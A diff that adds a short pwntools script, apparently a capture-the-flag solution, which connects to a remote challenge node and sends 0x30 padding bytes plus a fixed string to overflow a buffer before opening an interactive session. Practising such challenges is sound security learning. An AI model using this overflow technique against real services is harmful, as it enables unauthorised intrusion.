@@ -1,0 +1,6 @@
+from pwn import *
+context(arch='amd64',os='linux',log_level='debug')
+io=remote('node5.buuoj.cn',29058)
+payload=b'a'*0x30+b'n0t_r3@11y_f1@g'
+io.sendline(payload)
+io.interactive()
